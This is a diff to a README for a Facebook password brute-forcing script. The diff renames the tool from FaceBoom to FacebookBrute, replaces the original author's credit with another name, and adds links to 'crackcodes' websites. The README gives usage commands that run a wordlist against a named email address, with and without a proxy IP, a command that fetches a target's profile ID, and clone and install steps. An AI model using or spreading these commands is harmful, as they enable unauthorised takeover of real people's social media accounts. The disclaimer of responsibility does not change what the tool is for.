@@ -1,5 +1,6 @@
 ***
-  - SCRIPT: **FaceBoom**
+Go to my Websites https://www.crackcodes.xyz and https://www.crackcodes.in
+  - SCRIPT: **FacebookBrute**
   -    JOB: **Brute Force Attack On Facebook Accounts**
 ***
 
@@ -12,19 +13,19 @@
 
     - **Brute Force On Facebook Account Without proxy**:
      
-     * **Command**: python faceboom.py -t Oseid@gmail.com -w wlist.txt
+     * **Command**: python3 facebookBrute.py -t Oseid@gmail.com -w wlist.txt
      
          ![withoutProxy](https://user-images.githubusercontent.com/29546157/88088721-8af27d00-cb93-11ea-828c-b80f1996a234.PNG)
    
    - **Brute Force On Facebook Account With Proxy**:
    
-    * **Command**: python faceboom.py -t Oseid@gmail.com -w wlist.txt -p 144.217.101.245:3129
+    * **Command**: python3 facebookBrute.py -t Oseid@gmail.com -w wlist.txt -p 144.217.101.245:3129
     
          ![withProxy](https://user-images.githubusercontent.com/29546157/88088728-8f1e9a80-cb93-11ea-964e-930aeea10dcd.PNG)
 
    - **Get Target Facebook Profile ID**:
    
-    * **Command**: python faceboom.py -g https://www.facebook.com/zuck
+    * **Command**: python3 facebookBrute.py -g https://www.facebook.com/zuck
     
          ![getID](https://user-images.githubusercontent.com/29546157/88082079-f9cad880-cb89-11ea-894b-801e8c4fe369.PNG)
 
@@ -32,8 +33,8 @@
 
 # For Install:
 
- - git clone https://github.com/Oseid/FaceBoom.git
- - cd FaceBoom/
+ - git clone https://github.com/MCracker2002/FacebookBrute.git
+ - cd FacebookBrute/
  - pip install requests
  - pip install mechanize
 ***
@@ -58,6 +59,6 @@
   * i am not responsible for your actions.
 
 # That's All :)
-   * This Script Coded By Oseid Aldary
+   * This Script Coded By MCracker2002
    * Thanks For Usage
    * Have A Nice Day...GoodBye :)
